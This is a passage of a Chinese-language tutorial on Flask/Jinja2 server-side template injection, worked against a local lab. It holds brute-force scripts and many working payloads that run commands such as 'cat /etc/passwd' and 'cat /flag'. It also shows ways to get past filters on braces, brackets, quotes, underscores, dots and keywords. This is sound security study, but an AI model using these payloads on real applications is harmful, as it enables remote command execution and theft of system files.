srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120029.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120029.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120029.jpeg 2x" sizes=auto alt=f23b49e1300bf62a765f1a648b10d807_MD5></a></figure></p><p>试了一下发现popen可以利用</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120904.jpeg title=1800ec0fabec31b66e072cb366bf12cf_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120904.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120904.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120904.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120904.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120904.jpeg 2x" sizes=auto alt=1800ec0fabec31b66e072cb366bf12cf_MD5></a></figure></p><p>读一下根目录</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120147.jpeg title=18caf5306ddd49289289b4b8c2143cbf_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120147.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120147.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120147.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120147.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120147.jpeg 2x" sizes=auto alt=18caf5306ddd49289289b4b8c2143cbf_MD5></a></figure></p><p>发现flag</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120143.jpeg title=d6ea25b002b042120aa9f539a8e3e68c_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120143.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120143.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120143.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120143.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120143.jpeg 2x" sizes=auto alt=d6ea25b002b042120aa9f539a8e3e68c_MD5></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120295.jpeg title=300667d4c8f70f61be6a21bd44d9f858_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120295.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120295.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120295.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120295.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120295.jpeg 2x" sizes=auto alt=300667d4c8f70f61be6a21bd44d9f858_MD5></a></figure></p><h2 id=bypass class=headerLink><a href=#bypass class=header-mark></a>Bypass</h2><h3 id=过滤- class=headerLink><a href=#%e8%bf%87%e6%bb%a4- class=header-mark></a>过滤<code>{{ }}</code></h3><p>尝试<code>{% %}</code>代替</p><p><code>##</code>可以有和<code>{% %}</code>相同的效果</p><p><strong>解题思路</strong></p><p>判断<code>{{ }}</code>被过滤，尝试<code>{% %}</code></p><p>除此之外，也可以使用 <code>{%print(......)%}</code> 这样的语法来代替 <code>{{</code>，当有 <code>print</code> 的时候，会存在回显</p><p>判断语句能否正常执行<code>{% if 2>1 %}world{%endif%}</code>，由于 <code>{% if ... %}world{% endif %}</code> 没有回显，所以需要配合 curl 来进行反弹 shell 或者将数据外带用 dnslog 回显</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120429.jpeg title=57ccd1b2cd1d89fbe177d51dbef9d7b5_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120429.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120429.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120429.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120429.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120429.jpeg 2x" sizes=auto alt=57ccd1b2cd1d89fbe177d51dbef9d7b5_MD5></a></figure></p><p>再构造如下语句<code>{% if ''.__class__ %}worldddd{%endif%}</code>有回显则说明<code>''.__class__</code>有内容</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120482.jpeg title=d09f3d7decced2c24e1fbb1a07e17d43_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120482.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120482.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120482.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120482.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120482.jpeg 2x" sizes=auto alt=d09f3d7decced2c24e1fbb1a07e17d43_MD5></a></figure></p><p>构造脚本查询可以使用"popen"的子类编号，代码意在判断哪个指令下有 popen 可以利用，那么<code>cat /etc/passwd</code>就能正常执行，回复给 if 的就为 <strong>True</strong> ，一旦为 <strong>True</strong> ，就能输出 <strong>WORLD</strong> 字符</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:8089/flasklab/level/2&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;code&#34;</span><span class=p>:</span><span class=s1>&#39;{</span><span class=si>% i</span><span class=s1>f &#34;&#34;.__class__.__base__.__subclasses__()[&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;].__init__.__globals__[&#34;popen&#34;](&#34;cat /etc/passwd&#34;).read() %}WORLD{</span><span class=si>% e</span><span class=s1>ndif %}&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;WORLD&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=s2>&#34;--&gt;&#34;</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span></code></pre></div><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120662.jpeg title=ff83ded29bc4c099c3222ba006b4abfe_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120662.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120662.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120662.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120662.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120662.jpeg 2x" sizes=auto alt=ff83ded29bc4c099c3222ba006b4abfe_MD5></a></figure></p><p>117模块能直接调用 popen ，使用 print 执行命令</p><p><code>{%print("".__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]("cat /etc/passwd").read())%}</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120716.jpeg title=387a70385e68e46803f6d0adac2eba7c_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120716.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120716.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120716.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120716.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120716.jpeg 2x" sizes=auto alt=387a70385e68e46803f6d0adac2eba7c_MD5></a></figure></p><h3 id=过滤--1 class=headerLink><a href=#%e8%bf%87%e6%bb%a4--1 class=header-mark></a>过滤<code>[ ]</code></h3><h4 id=使用-__getitem__-绕过 class=headerLink><a href=#%e4%bd%bf%e7%94%a8-__getitem__-%e7%bb%95%e8%bf%87 class=header-mark></a>使用 <code>__getitem__</code> 绕过</h4><p><code>getitem()</code>是python 的一个魔术方法，可以用来输出序列属性中的某个索引处的元素</p><p>对<strong>字典</strong>使用时，传入<strong>字符串</strong>，返回字典相对应<strong>键所对应的值</strong></p><p>对<strong>列表</strong>使用时，传入<strong>整数</strong>返回列表对应<strong>索引的值</strong></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120767.jpeg title=c058b4fd2b81ccc28a77a479a8965905_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120767.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120767.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120767.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120767.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120767.jpeg 2x" sizes=auto alt=c058b4fd2b81ccc28a77a479a8965905_MD5></a></figure></p><p>使用<code>__getitem__</code>可获取列表的某一个值，可以代替<code>[]</code></p><p><code>{{''.__class__.__base__.__subclasses__()[1]}}</code></p><p>等价于</p><p><code>{{''.__class__.__base__.__subclasses__().__getitem__(1)}}</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:8089/flasklab/level/4&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;code&#34;</span><span class=p>:</span><span class=s1>&#39;{{().__class__.__base__.__subclasses__().__getitem__(&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;)}}&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;_wrap_close&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=s2>&#34;--&gt;&#34;</span><span class=p>,</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span></code></pre></div><p>payload：<code>{{''.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /etc/passwd').read()}}</code></p><h4 id=使用-get-仅限-dict class=headerLink><a href=#%e4%bd%bf%e7%94%a8-get-%e4%bb%85%e9%99%90-dict class=header-mark></a>使用 <code>get()</code>, 仅限 dict</h4><p><code>''.__class__.__mro__.__getitem__(-1).__subclasses__().get(72).__init__.__globals__.get('os').system('whoami')</code></p><h4 id=使用-pop会删除值慎用 class=headerLink><a href=#%e4%bd%bf%e7%94%a8-pop%e4%bc%9a%e5%88%a0%e9%99%a4%e5%80%bc%e6%85%8e%e7%94%a8 class=header-mark></a>使用 <code>pop()</code>，会删除值，慎用</h4><p><code>pop()</code> 可以返回指定序列属性中的某个索引处的元素，或者指定字典属性中某个键对应的值</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>{{&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40) (&#39;/etc/passwd&#39;).read()}}       // 指定序列属性
</span></span><span class=line><span class=cl>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init_ _.__globals__.pop(&#39;__builtins__&#39;).pop(&#39;eval&#39;)
</span></span><span class=line><span class=cl>(&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}       // 指定字典属性
</span></span></code></pre></div><p><strong>不建议使用这个方法，因为 pop 会删除相应位置的值，但对于这个表达式的 list 来说使用没有问题</strong></p><h4 id=使用--访问 class=headerLink><a href=#%e4%bd%bf%e7%94%a8--%e8%ae%bf%e9%97%ae class=header-mark></a>使用 <code>.</code> 访问</h4><p>除了标准的python语法使用点<code>（.）</code>外，还可以使用中括号<code>（[]）</code>来访问变量的属性</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>{{&#34;&#34;.__class__}}
</span></span><span class=line><span class=cl>{{&#34;&#34;[&#39;__classs__&#39;]}}
</span></span></code></pre></div><p><code>''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(72).__init__.__globals__.os.system('whoami')</code></p><p><code>''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(59).__init__.__globals__.linecache.os.popen('whoami').read()</code></p><p>Flask 环境下测试成功, 但在 python shell 中运行会报错</p><h3 id=过滤单双引号 class=headerLink><a href=#%e8%bf%87%e6%bb%a4%e5%8d%95%e5%8f%8c%e5%bc%95%e5%8f%b7 class=header-mark></a>过滤单/双引号</h3><h4 id=使用-request对象绕过 class=headerLink><a href=#%e4%bd%bf%e7%94%a8-request%e5%af%b9%e8%b1%a1%e7%bb%95%e8%bf%87 class=header-mark></a>使用 request对象绕过</h4><p><code>request</code>在 flask 中可以访问基于 HTTP 请求传递的所有信息，此 request 并非 python 函数，而是在 flask 内部的函数</p><p><code>**request.args.key**</code><strong>获取get传入的key的值</strong></p><p><code>**request.values.x1**</code><strong>所有参数</strong></p><p><code>**request.cookies**</code><strong>获取cookie传入参数</strong></p><p><code>**request.headers**</code><strong>获取请求头请求参数</strong></p><p><code>**request.from.key**</code><strong>获取post传入参数(Content-Type:application/x-www-form-urlencoded 或 multipart/form-data)</strong></p><p><code>**request.data**</code><strong>获取post传入参数(Content-Type:a/b)</strong></p><p><code>**request.json**</code><strong>获取post传入json参数(Content-Type:application/json)</strong></p><hr><p>利用 request.args.key** **传参绕过单双引号过滤进行命令执行</p><p>GET：<code>?a=popen&amp;b=cat /flag</code></p><p>POST：<code>code={{().__class__.__base__.__subclasses__()[117].__init__.__globals__[**request.args.a**](**request.args.b**).read())}}</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120784.jpeg title=0c2b62192517307770e0dda14d333f54_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120784.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120784.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120784.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120784.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120784.jpeg 2x" sizes=auto alt=0c2b62192517307770e0dda14d333f54_MD5></a></figure></p><p><code>?name={{x.__init__.__globals__[request.args.x1].eval(request.args.x2)}}&amp;x1=__builtins__&amp;x2=__import__('os').popen('cat /flag').read()</code></p><h4 id=使用-chr-绕过 class=headerLink><a href=#%e4%bd%bf%e7%94%a8-chr-%e7%bb%95%e8%bf%87 class=header-mark></a>使用 chr() 绕过</h4><p>同上</p><h3 id=过滤下划线 class=headerLink><a href=#%e8%bf%87%e6%bb%a4%e4%b8%8b%e5%88%92%e7%ba%bf class=header-mark></a>过滤下划线</h3><p><strong>过滤器</strong></p><p>过滤器通过管道符<code>|</code>与变量连接，并且在括号中可能有可选的参数</p><p><strong>flask常用过滤器</strong></p><pre tabindex=0><code>length()：获取一个序列或者字典的长度并将其返回

int()：将值转换为int类型

float()：将值转换为float类型

lower()：将字符串转换为小写

upper()：将字符串转换为大写

reverse()：反转字符串

replace(value,old,new)：将value中的old替换为new

list()：将变量转换为列表类型

string()：将变量转换成字符串类型

join()：将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用

attr()：获取对象的属性
</code></pre><p><strong>例题</strong></p><p><code>{{.__class__.__base__.__subclasses__().__getitem__(117).__init__.globals__.__getitem__('popen')('cat /flag').read()}}</code></p><p><strong>attr绕过下划线过滤</strong></p><p><code>{{''|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(199)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")()}}</code></p><h4 id=使用request方法 class=headerLink><a href=#%e4%bd%bf%e7%94%a8request%e6%96%b9%e6%b3%95 class=header-mark></a>使用request方法</h4><p>GET：<code>?cla=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;geti=__getitem__&amp;ini=__init__&amp;glo=__globals__</code></p><p>POST：<code>code={{''|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.geti)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)('popen')('cat /flag')|attr('read')()}}</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120862.jpeg title=e27978f0bbdd2de63e27e25da93c91c2_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120862.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120862.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120862.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120862.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120862.jpeg 2x" sizes=auto alt=e27978f0bbdd2de63e27e25da93c91c2_MD5></a></figure></p><h4 id=使用unicode编码 class=headerLink><a href=#%e4%bd%bf%e7%94%a8unicode%e7%bc%96%e7%a0%81 class=header-mark></a>使用unicode编码</h4><p><code>{{''|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(199)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")()}}</code></p><p>将带有<code>__</code>的函数进行 unicode encode</p><p><code>{{''|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(199)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("cat /flag")|attr("read")()}}</code></p><h4 id=使用16位编码 class=headerLink><a href=#%e4%bd%bf%e7%94%a816%e4%bd%8d%e7%bc%96%e7%a0%81 class=header-mark></a>使用16位编码</h4><p><code>{{''|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(199)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")()}}</code></p><p>将下划线全部替换成<code>\x5f</code></p><p><code>{{''|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(199)|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("cat /flag")|attr("read")()}}</code></p><h4 id=base64编码 class=headerLink><a href=#base64%e7%bc%96%e7%a0%81 class=header-mark></a>base64编码</h4><p>未能实现，python3下编码问题</p><p><code>{{''|attr('X19jbGFzc19f'.decode('base64'))|attr('X19iYXNlX18='.decode('base64'))|attr('X19zdWJjbGFzc2VzX18='.decode('base64'))()|attr('X19nZXRpdGVtX18='.decode('base64'))(199)|attr('X19pbml0X18='.decode('base64'))|attr('X19nbG9iYWxzX18='.decode('base64'))|attr('X19nZXRpdGVtX18='.decode('base64'))('os')|attr('popen')('cat /flag')|attr('read')()}}</code></p><h4 id=格式化字符串 class=headerLink><a href=#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2 class=header-mark></a>格式化字符串</h4><p><code>%c%(95)</code>即下划线</p><p><code>{{''|attr('%c%cclass%c%c'%(95,95,95,95))|attr('%c%cbase%c%c'%(95,95,95,95))|attr('%c%csubclasses%c%c'%(95,95,95,95))()|attr('%c%cgetitem%c%c'%(95,95,95,95))(199)|attr('%c%cinit%c%c'%(95,95,95,95))|attr('%c%cglobals%c%c'%(95,95,95,95))|attr('%c%cgetitem%c%c'%(95,95,95,95))('os')|attr('popen')('cat /flag')|attr('read')()}}</code></p><h4 id=通过flask内嵌函数方法提取下划线进行拼接 class=headerLink><a href=#%e9%80%9a%e8%bf%87flask%e5%86%85%e5%b5%8c%e5%87%bd%e6%95%b0%e6%96%b9%e6%b3%95%e6%8f%90%e5%8f%96%e4%b8%8b%e5%88%92%e7%ba%bf%e8%bf%9b%e8%a1%8c%e6%8b%bc%e6%8e%a5 class=header-mark></a>通过flask内嵌函数/方法提取下划线进行拼接</h4><h3 id=过滤点 class=headerLink><a href=#%e8%bf%87%e6%bb%a4%e7%82%b9 class=header-mark></a>过滤点</h3><h4 id=用中括号代替 class=headerLink><a href=#%e7%94%a8%e4%b8%ad%e6%8b%ac%e5%8f%b7%e4%bb%a3%e6%9b%bf class=header-mark></a>用中括号<code>[]</code>代替<code>.</code></h4><p>python语法除了可以使用点<code>.</code>来访问对象属性外，还可以用中括号<code>[]</code></p><p><code>{{()['__class__']['__base__']['__subclasses__']()[117]['__init__']['__globals__']['popen']('cat /flag')['read']()}}</code></p><h4 id=用attr绕过 class=headerLink><a href=#%e7%94%a8attr%e7%bb%95%e8%bf%87 class=header-mark></a>用<code>attr()</code>绕过</h4><p>payload语句中不会用到点<code>.</code>和中括号<code>[]</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>().__class__ 
</span></span><span class=line><span class=cl>等同于
</span></span><span class=line><span class=cl>()|attr(&#34;__class__&#34;)
</span></span></code></pre></div><p><code>{{()|attr("__class__")|attr("__base__")|attr("__subclasses__") ()|attr("__getitem__") (77)|attr("__init__")|attr("__globals__")|attr("__getitem__") ("os")|attr("popen")("ls /")|attr("read")()}}</code></p><h3 id=过滤关键词 class=headerLink><a href=#%e8%bf%87%e6%bb%a4%e5%85%b3%e9%94%ae%e8%af%8d class=header-mark></a>过滤关键词</h3><p>过滤<code>class``arg``value``int``global</code>等关键字</p><p>以<code>class</code>为例</p><h4 id=编码绕过 class=headerLink><a href=#%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87 class=header-mark></a>编码绕过</h4><p>base64</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__bases__</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;X19idWlsdGluc19f&#39;</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;base64&#39;</span><span class=p>)]</span> <span class=p>[</span><span class=s1>&#39;ZXZhbA==&#39;</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;base64&#39;</span><span class=p>)]</span> <span class=p>(</span><span class=s1>&#39;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#39;</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;base64&#39;</span><span class=p>)</span> <span class=p>)}}</span>
</span></span><span class=line><span class=cl><span class=o>//</span><span class=n>与下面等价</span>
</span></span><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__bases__</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;eval&#39;</span><span class=p>]</span> <span class=p>(</span><span class=s1>&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class=p>)}}</span>
</span></span></code></pre></div><p>Unicode 编码绕过</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__bases__</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;</span><span class=se>\u005f\u005f\u0062\u0075\u0069\u006c\u0074</span><span class=s1>\u0 069</span><span class=se>\u006e\u0073\u005f\u005f</span><span class=s1>&#39;</span><span class=p>][</span><span class=s1>&#39;</span><span class=se>\u0065\u0076\u0061\u006c</span><span class=s1>&#39;</span><span class=p>]</span> <span class=p>(</span><span class=s1>&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl><span class=o>//</span><span class=n>等同于</span>
